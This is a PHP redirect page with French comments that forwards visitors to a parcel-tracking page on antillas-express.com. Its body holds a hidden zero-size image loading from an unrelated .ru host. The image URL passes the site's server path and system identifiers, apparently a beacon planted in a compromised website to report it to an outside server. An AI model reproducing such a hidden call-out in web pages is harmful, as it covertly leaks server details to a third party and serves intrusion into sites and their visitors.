<?php
//L’ordre des 3 lignes suivantes est important pour que cela marche sous
//différentes versions et configurations de PHP et de serveur (en particulier IIS)
header('Location: http://www.antillas-express.com/colis.php'); //Adresse de la nouvelle page
header('HTTP/1.1 301 Moved Permanently'); //Code HTTP de redirection permanente
header('Status: 301 Moved Permanently'); //Doublon utile à certaines versions de PHP et serveurs
header('Content-Type: text/html; charset=UTF-8');
echo '<'.'?xml version="1.0" encoding="UTF-8"?'.'>'; //entête XML
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta http-equiv="refresh" content="0; url=http://www.antillas-express.com/colis.php" /> //Redirection HTML
<title>Redirection</title>
<meta name="robots" content="noindex,follow" />
</head>

<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<p><a href="http://www.antillas-express.com/colis.php">Redirection</a></p>
</body>
</html>
